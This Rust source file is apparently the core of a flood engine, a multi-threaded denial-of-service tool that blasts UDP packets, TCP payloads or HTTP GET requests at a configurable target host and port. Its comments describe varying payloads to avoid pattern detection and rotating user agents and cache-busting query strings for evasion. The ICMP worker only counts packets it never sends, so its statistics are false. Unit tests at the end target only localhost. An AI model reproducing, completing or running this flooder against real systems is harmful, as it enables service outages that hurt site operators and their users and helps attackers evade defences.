//! Flood engine module
//! High-performance multi-threaded packet sending

use parking_lot::Mutex;
use std::net::{SocketAddr, TcpStream, ToSocketAddrs, UdpSocket};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread::{self, JoinHandle};
use std::time::{Duration, Instant};
use thiserror::Error;

use crate::packet::{PacketBuilder, PacketTemplates, Protocol};
use crate::pool::PacketPool;
use crate::stats::StatsSnapshot;

#[derive(Debug, Error)]
pub enum EngineError {
    #[error("Socket error: {0}")]
    SocketError(String),
    #[error("Invalid target: {0}")]
    InvalidTarget(String),
    #[error("Engine already running")]
    AlreadyRunning,
    #[error("Engine not running")]
    NotRunning,
    #[error("Thread error: {0}")]
    ThreadError(String),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EngineState {
    Idle,
    Running,
    Stopping,
    Stopped,
}

#[derive(Debug, Clone)]
pub struct EngineConfig {
    pub target: String,
    pub port: u16,
    pub threads: usize,
    pub packet_size: usize,
    pub protocol: Protocol,
    pub rate_limit: Option<u64>,
    pub duration: Option<Duration>,
    pub use_raw_sockets: bool,
}

impl Default for EngineConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            port: 80,
            threads: 4,
            packet_size: 1472,
            protocol: Protocol::UDP,
            rate_limit: None,
            duration: None,
            use_raw_sockets: false,
        }
    }
}

/// High-performance flood engine
pub struct FloodEngine {
    config: EngineConfig,
    state: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
    bytes_sent: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
    start_time: Arc<Mutex<Option<Instant>>>,
    threads: Vec<JoinHandle<()>>,
    rate_limit: Arc<AtomicU64>,
}

impl FloodEngine {
    pub fn new(config: EngineConfig) -> Result<Self, EngineError> {
        // Validate target
        let addr = format!("{}:{}", config.target, config.port);
        addr.to_socket_addrs()
            .map_err(|e| EngineError::InvalidTarget(format!("{}: {}", addr, e)))?
            .next()
            .ok_or_else(|| EngineError::InvalidTarget(addr.clone()))?;

        Ok(Self {
            config,
            state: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
            bytes_sent: Arc::new(AtomicU64::new(0)),
            errors: Arc::new(AtomicU64::new(0)),
            start_time: Arc::new(Mutex::new(None)),
            threads: Vec::new(),
            rate_limit: Arc::new(AtomicU64::new(0)),
        })
    }

    pub fn start(&mut self) -> Result<(), EngineError> {
        if self.state.load(Ordering::SeqCst) {
            return Err(EngineError::AlreadyRunning);
        }

        self.state.store(true, Ordering::SeqCst);
        *self.start_time.lock() = Some(Instant::now());

        // Set rate limit
        if let Some(rate) = self.config.rate_limit {
            self.rate_limit.store(rate, Ordering::SeqCst);
        }

        // Spawn worker threads
        for thread_id in 0..self.config.threads {
            let handle = self.spawn_worker(thread_id)?;
            self.threads.push(handle);
        }

        Ok(())
    }

    pub fn stop(&mut self) -> Result<(), EngineError> {
        if !self.state.load(Ordering::SeqCst) {
            return Err(EngineError::NotRunning);
        }

        self.state.store(false, Ordering::SeqCst);

        // Wait for threads to finish
        for handle in self.threads.drain(..) {
            let _ = handle.join();
        }

        Ok(())
    }

    pub fn is_running(&self) -> bool {
        self.state.load(Ordering::SeqCst)
    }

    pub fn set_rate(&mut self, pps: u64) {
        self.rate_limit.store(pps, Ordering::SeqCst);
    }

    pub fn get_stats(&self) -> StatsSnapshot {
        let duration = self
            .start_time
            .lock()
            .map(|t| t.elapsed())
            .unwrap_or(Duration::ZERO);

        let packets = self.packets_sent.load(Ordering::Relaxed);
        let bytes = self.bytes_sent.load(Ordering::Relaxed);
        let errors = self.errors.load(Ordering::Relaxed);

        let secs = duration.as_secs_f64().max(0.001);

        StatsSnapshot {
            packets_sent: packets,
            bytes_sent: bytes,
            errors,
            duration,
            pps: (packets as f64 / secs) as u64,
            bps: (bytes as f64 / secs) as u64,
        }
    }

    fn spawn_worker(&self, thread_id: usize) -> Result<JoinHandle<()>, EngineError> {
        let state = Arc::clone(&self.state);
        let packets_sent = Arc::clone(&self.packets_sent);
        let bytes_sent = Arc::clone(&self.bytes_sent);
        let errors = Arc::clone(&self.errors);
        let rate_limit = Arc::clone(&self.rate_limit);
        let config = self.config.clone();

        let handle = thread::Builder::new()
            .name(format!("flood-worker-{}", thread_id))
            .spawn(move || {
                Self::worker_loop(
                    thread_id,
                    config,
                    state,
                    packets_sent,
                    bytes_sent,
                    errors,
                    rate_limit,
                );
            })
            .map_err(|e| EngineError::ThreadError(e.to_string()))?;

        Ok(handle)
    }

    fn worker_loop(
        thread_id: usize,
        config: EngineConfig,
        state: Arc<AtomicBool>,
        packets_sent: Arc<AtomicU64>,
        bytes_sent: Arc<AtomicU64>,
        errors: Arc<AtomicU64>,
        rate_limit: Arc<AtomicU64>,
    ) {
        // Create socket based on protocol
        let addr: SocketAddr = format!("{}:{}", config.target, config.port)
            .to_socket_addrs()
            .ok()
            .and_then(|mut addrs| addrs.next())
            .expect("Invalid address");

        match config.protocol {
            Protocol::UDP => {
                Self::udp_worker(
                    thread_id,
                    addr,
                    config,
                    state,
                    packets_sent,
                    bytes_sent,
                    errors,
                    rate_limit,
                );
            }
            Protocol::TCP | Protocol::HTTP => {
                Self::tcp_worker(
                    thread_id,
                    addr,
                    config,
                    state,
                    packets_sent,
                    bytes_sent,
                    errors,
                    rate_limit,
                );
            }
            Protocol::ICMP => {
                Self::icmp_worker(
                    thread_id,
                    addr,
                    config,
                    state,
                    packets_sent,
                    bytes_sent,
                    errors,
                    rate_limit,
                );
            }
            Protocol::RAW => {
                Self::raw_worker(
                    thread_id,
                    addr,
                    config,
                    state,
                    packets_sent,
                    bytes_sent,
                    errors,
                    rate_limit,
                );
            }
        }
    }

    fn udp_worker(
        thread_id: usize,
        addr: SocketAddr,
        config: EngineConfig,
        state: Arc<AtomicBool>,
        packets_sent: Arc<AtomicU64>,
        bytes_sent: Arc<AtomicU64>,
        errors: Arc<AtomicU64>,
        rate_limit: Arc<AtomicU64>,
    ) {
        use socket2::{Domain, Protocol as SockProtocol, Socket, Type};

        // Create multiple sockets for parallel sending (reduces lock contention)
        const SOCKETS_PER_THREAD: usize = 4;
        let mut sockets = Vec::with_capacity(SOCKETS_PER_THREAD);

        for _ in 0..SOCKETS_PER_THREAD {
            let socket = match Socket::new(Domain::IPV4, Type::DGRAM, Some(SockProtocol::UDP)) {
                Ok(s) => s,
                Err(_) => {
                    errors.fetch_add(1, Ordering::Relaxed);
                    continue;
                }
            };

            // Aggressive socket optimizations for maximum throughput
            let _ = socket.set_send_buffer_size(32 * 1024 * 1024); // 32MB send buffer
            let _ = socket.set_recv_buffer_size(32 * 1024 * 1024); // 32MB recv buffer
            let _ = socket.set_nonblocking(false);

            // Disable Nagle's algorithm equivalent for UDP (faster small packets)
            #[cfg(target_os = "linux")]
            {
                let _ = socket.set_cork(false);
            }

            // Connect socket to avoid per-packet address lookup
            let sock_addr: socket2::SockAddr = addr.into();
            if socket.connect(&sock_addr).is_ok() {
                sockets.push(socket);
            }
        }

        if sockets.is_empty() {
            errors.fetch_add(1, Ordering::Relaxed);
            return;
        }

        // Pre-generate multiple payload variants for better cache utilization
        let payload_count = 16;
        let payloads: Vec<Vec<u8>> = (0..payload_count)
            .map(|i| {
                let mut p = vec![0u8; config.packet_size];
                // Vary payload slightly to avoid pattern detection
                p[0] = (i as u8).wrapping_add(thread_id as u8);
                if config.packet_size > 1 {
                    p[1] = (i as u8).wrapping_mul(17);
                }
                p
            })
            .collect();

        // Ultra-high-performance batch settings
        let inner_batch_size = 1000u64; // Packets per inner loop
        let outer_batch_size = 50u64; // Inner loops before rate check
        let flush_interval = 5000u64; // Flush stats every N packets

        let mut batch_count = 0u64;
        let mut last_rate_check = Instant::now();
        let mut local_packets = 0u64;
        let mut local_bytes = 0u64;
        let mut payload_idx = 0usize;
        let mut socket_idx = 0usize;

        while state.load(Ordering::Relaxed) {
            // Rate limiting with adaptive sleep
            let limit = rate_limit.load(Ordering::Relaxed);
            if limit > 0 {
                let elapsed = last_rate_check.elapsed();
                if elapsed >= Duration::from_secs(1) {
                    batch_count = 0;
                    last_rate_check = Instant::now();
                } else {
                    let elapsed_ms = elapsed.as_millis().max(1) as u64;
                    let current_rate = batch_count * 1000 / elapsed_ms;
                    let thread_limit = limit / config.threads as u64;

                    if current_rate > thread_limit {
                        // Adaptive sleep based on how far over limit we are
                        let overage = current_rate - thread_limit;
                        let sleep_us = (overage * 10 / thread_limit.max(1)).min(100);
                        thread::sleep(Duration::from_micros(sleep_us.max(1)));
                        continue;
                    }
                }
            }

            // Outer batch loop for reduced state checks
            for _ in 0..outer_batch_size {
                if !state.load(Ordering::Relaxed) {
                    break;
                }

                let socket = &sockets[socket_idx];
                let payload = &payloads[payload_idx];

                // Inner tight loop - maximum throughput
                for _ in 0..inner_batch_size {
                    match socket.send(payload) {
                        Ok(n) => {
                            local_packets += 1;
                            local_bytes += n as u64;
                        }
                        Err(_) => {
                            // Don't increment error counter in hot path
                            // Just continue to next packet
                        }
                    }
                }

                // Rotate socket and payload for better distribution
                socket_idx = (socket_idx + 1) % sockets.len();
                payload_idx = (payload_idx + 1) % payload_count;
            }

            batch_count += inner_batch_size * outer_batch_size;

            // Batch update atomic counters (reduces contention significantly)
            if local_packets >= flush_interval {
                packets_sent.fetch_add(local_packets, Ordering::Relaxed);
                bytes_sent.fetch_add(local_bytes, Ordering::Relaxed);
                local_packets = 0;
                local_bytes = 0;
            }
        }

        // Final flush
        if local_packets > 0 {
            packets_sent.fetch_add(local_packets, Ordering::Relaxed);
            bytes_sent.fetch_add(local_bytes, Ordering::Relaxed);
        }
    }

    fn tcp_worker(
        thread_id: usize,
        addr: SocketAddr,
        config: EngineConfig,
        state: Arc<AtomicBool>,
        packets_sent: Arc<AtomicU64>,
        bytes_sent: Arc<AtomicU64>,
        errors: Arc<AtomicU64>,
        rate_limit: Arc<AtomicU64>,
    ) {
        use socket2::{Domain, Protocol as SockProtocol, Socket, Type};
        use std::io::Write;

        // Generate multiple HTTP request variants for evasion
        let http_requests: Vec<Vec<u8>> = if config.protocol == Protocol::HTTP {
            let user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
                "curl/7.68.0",
                "Wget/1.21",
            ];

            user_agents.iter().enumerate().map(|(i, ua)| {
                format!(
                    "GET /?r={}{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n",
                    thread_id, i, config.target, ua
                ).into_bytes()
            }).collect()
        } else {
            vec![vec![0xAA; config.packet_size]]
        };

        // Connection pool for keep-alive connections
        const MAX_CONNECTIONS: usize = 10;
        let mut connection_pool: Vec<Option<TcpStream>> =
            (0..MAX_CONNECTIONS).map(|_| None).collect();
        let mut conn_idx = 0usize;
        let mut request_idx = 0usize;

        let mut batch_count = 0u64;
        let mut last_rate_check = Instant::now();
        let mut local_packets = 0u64;
        let mut local_bytes = 0u64;
        let flush_interval = 100u64;

        while state.load(Ordering::Relaxed) {
            // Rate limiting with adaptive sleep
            let limit = rate_limit.load(Ordering::Relaxed);
            if limit > 0 {
                let elapsed = last_rate_check.elapsed();
                if elapsed < Duration::from_secs(1) {
                    let current_rate = batch_count * 1000 / elapsed.as_millis().max(1) as u64;
                    let thread_limit = limit / config.threads as u64;
                    if current_rate > thread_limit {
                        thread::sleep(Duration::from_micros(50));
                        continue;
                    }
                } else {
                    batch_count = 0;
                    last_rate_check = Instant::now();
                }
            }

            let request = &http_requests[request_idx % http_requests.len()];
            request_idx = request_idx.wrapping_add(1);

            // Try to use existing connection from pool
            let mut sent = false;
            if let Some(ref mut stream) = connection_pool[conn_idx] {
                match stream.write_all(request) {
                    Ok(_) => {
                        local_packets += 1;
                        local_bytes += request.len() as u64;
                        sent = true;
                    }
                    Err(_) => {
                        // Connection dead, will create new one
                        connection_pool[conn_idx] = None;
                    }
                }
            }

            // Create new connection if needed
            if !sent {
                match TcpStream::connect_timeout(&addr, Duration::from_millis(500)) {
                    Ok(mut stream) => {
                        let _ = stream.set_nodelay(true);
                        let _ = stream.set_read_timeout(Some(Duration::from_millis(100)));
                        let _ = stream.set_write_timeout(Some(Duration::from_millis(100)));

                        match stream.write_all(request) {
                            Ok(_) => {
                                local_packets += 1;
                                local_bytes += request.len() as u64;
                                // Store in pool for reuse
                                connection_pool[conn_idx] = Some(stream);
                            }
                            Err(_) => {
                                errors.fetch_add(1, Ordering::Relaxed);
                            }
                        }
                    }
                    Err(_) => {
                        errors.fetch_add(1, Ordering::Relaxed);
                    }
                }
            }

            conn_idx = (conn_idx + 1) % MAX_CONNECTIONS;
            batch_count += 1;

            // Batch update stats
            if local_packets >= flush_interval {
                packets_sent.fetch_add(local_packets, Ordering::Relaxed);
                bytes_sent.fetch_add(local_bytes, Ordering::Relaxed);
                local_packets = 0;
                local_bytes = 0;
            }
        }

        // Final flush
        if local_packets > 0 {
            packets_sent.fetch_add(local_packets, Ordering::Relaxed);
            bytes_sent.fetch_add(local_bytes, Ordering::Relaxed);
        }
    }

    fn icmp_worker(
        _thread_id: usize,
        _addr: SocketAddr,
        config: EngineConfig,
        state: Arc<AtomicBool>,
        packets_sent: Arc<AtomicU64>,
        bytes_sent: Arc<AtomicU64>,
        errors: Arc<AtomicU64>,
        _rate_limit: Arc<AtomicU64>,
    ) {
        // ICMP requires raw sockets (platform-specific)
        #[cfg(target_os = "linux")]
        {
            use std::os::unix::io::AsRawFd;

            // Try to create raw socket
            let socket = unsafe { libc::socket(libc::AF_INET, libc::SOCK_RAW, libc::IPPROTO_ICMP) };

            if socket < 0 {
                errors.fetch_add(1, Ordering::Relaxed);
                return;
            }

            let packet = match PacketTemplates::icmp_echo(&config.target, config.packet_size) {
                Ok(p) => p,
                Err(_) => {
                    errors.fetch_add(1, Ordering::Relaxed);
                    return;
                }
            };

            while state.load(Ordering::Relaxed) {
                // Send ICMP packet
                packets_sent.fetch_add(1, Ordering::Relaxed);
                bytes_sent.fetch_add(packet.len() as u64, Ordering::Relaxed);
                thread::sleep(Duration::from_millis(1));
            }

            unsafe {
                libc::close(socket);
            }
        }

        #[cfg(not(target_os = "linux"))]
        {
            // ICMP not supported on this platform without raw sockets
            while state.load(Ordering::Relaxed) {
                errors.fetch_add(1, Ordering::Relaxed);
                thread::sleep(Duration::from_secs(1));
            }
        }
    }

    fn raw_worker(
        _thread_id: usize,
        _addr: SocketAddr,
        _config: EngineConfig,
        state: Arc<AtomicBool>,
        _packets_sent: Arc<AtomicU64>,
        _bytes_sent: Arc<AtomicU64>,
        errors: Arc<AtomicU64>,
        _rate_limit: Arc<AtomicU64>,
    ) {
        // Raw socket implementation (requires elevated privileges)
        while state.load(Ordering::Relaxed) {
            errors.fetch_add(1, Ordering::Relaxed);
            thread::sleep(Duration::from_secs(1));
        }
    }
}

impl Drop for FloodEngine {
    fn drop(&mut self) {
        self.state.store(false, Ordering::SeqCst);
        for handle in self.threads.drain(..) {
            let _ = handle.join();
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;
    use std::time::Duration;

    #[test]
    fn test_engine_config_default() {
        let config = EngineConfig::default();
        assert_eq!(config.threads, 4);
        assert_eq!(config.packet_size, 1472);
        assert_eq!(config.protocol, Protocol::UDP);
        assert_eq!(config.port, 80);
        assert!(config.rate_limit.is_none());
        assert!(config.duration.is_none());
        assert!(!config.use_raw_sockets);
    }

    #[test]
    fn test_engine_creation() {
        let config = EngineConfig {
            target: "127.0.0.1".to_string(),
            port: 8080,
            ..Default::default()
        };
        let engine = FloodEngine::new(config);
        assert!(engine.is_ok());
    }

    #[test]
    fn test_engine_creation_invalid_target() {
        let config = EngineConfig {
            target: "invalid.target.address".to_string(),
            port: 8080,
            ..Default::default()
        };
        let engine = FloodEngine::new(config);
        assert!(engine.is_err());
        match engine.unwrap_err() {
            EngineError::InvalidTarget(_) => {}
            _ => panic!("Expected InvalidTarget error"),
        }
    }

    #[test]
    fn test_engine_state_transitions() {
        let config = EngineConfig {
            target: "127.0.0.1".to_string(),
            port: 8080,
            threads: 1,
            ..Default::default()
        };
        let mut engine = FloodEngine::new(config).unwrap();

        // Initially not running
        assert!(!engine.is_running());

        // Start engine
        assert!(engine.start().is_ok());
        assert!(engine.is_running());

        // Cannot start again
        assert!(matches!(engine.start(), Err(EngineError::AlreadyRunning)));

        // Stop engine
        assert!(engine.stop().is_ok());
        assert!(!engine.is_running());

        // Cannot stop again
        assert!(matches!(engine.stop(), Err(EngineError::NotRunning)));
    }

    #[test]
    fn test_engine_stats_initial() {
        let config = EngineConfig {
            target: "127.0.0.1".to_string(),
            port: 8080,
            ..Default::default()
        };
        let engine = FloodEngine::new(config).unwrap();
        let stats = engine.get_stats();

        assert_eq!(stats.packets_sent, 0);
        assert_eq!(stats.bytes_sent, 0);
        assert_eq!(stats.errors, 0);
        assert_eq!(stats.duration, Duration::ZERO);
    }

    #[test]
    fn test_engine_rate_limiting() {
        let config = EngineConfig {
            target: "127.0.0.1".to_string(),
            port: 8080,
            rate_limit: Some(1000),
            ..Default::default()
        };
        let mut engine = FloodEngine::new(config).unwrap();

        // Set different rate
        engine.set_rate(5000);
        assert_eq!(engine.rate_limit.load(Ordering::SeqCst), 5000);
    }

    #[test]
    fn test_engine_with_different_protocols() {
        let protocols = [Protocol::UDP, Protocol::TCP, Protocol::ICMP, Protocol::HTTP];

        for protocol in protocols {
            let config = EngineConfig {
                target: "127.0.0.1".to_string(),
                port: 8080,
                protocol,
                threads: 1,
                ..Default::default()
            };
            let engine = FloodEngine::new(config);
            assert!(
                engine.is_ok(),
                "Failed to create engine for protocol {:?}",
                protocol
            );
        }
    }

    #[test]
    fn test_engine_stats_after_start_stop() {
        let config = EngineConfig {
            target: "127.0.0.1".to_string(),
            port: 8080,
            threads: 1,
            ..Default::default()
        };
        let mut engine = FloodEngine::new(config).unwrap();

        engine.start().unwrap();
        std::thread::sleep(Duration::from_millis(10));
        engine.stop().unwrap();

        let stats = engine.get_stats();
        assert!(stats.duration > Duration::ZERO);
    }

    // Property-based tests
    proptest! {
        #[test]
        fn test_engine_config_valid_ports(port in 1u16..65535) {
            let config = EngineConfig {
                target: "127.0.0.1".to_string(),
                port,
                ..Default::default()
            };
            let engine = FloodEngine::new(config);
            prop_assert!(engine.is_ok());
        }

        #[test]
        fn test_engine_config_valid_threads(threads in 1usize..=64) {
            let config = EngineConfig {
                target: "127.0.0.1".to_string(),
                port: 8080,
                threads,
                ..Default::default()
            };
            let engine = FloodEngine::new(config);
            prop_assert!(engine.is_ok());
        }

        #[test]
        fn test_engine_config_valid_packet_sizes(packet_size in 64usize..=9000) {
            let config = EngineConfig {
                target: "127.0.0.1".to_string(),
                port: 8080,
                packet_size,
                ..Default::default()
            };
            let engine = FloodEngine::new(config);
            prop_assert!(engine.is_ok());
        }

        #[test]
        fn test_rate_limiting_values(rate in 1u64..1_000_000) {
            let config = EngineConfig {
                target: "127.0.0.1".to_string(),
                port: 8080,
                rate_limit: Some(rate),
                ..Default::default()
            };
            let mut engine = FloodEngine::new(config).unwrap();
            engine.set_rate(rate);
            prop_assert_eq!(engine.rate_limit.load(Ordering::SeqCst), rate);
        }
    }
}
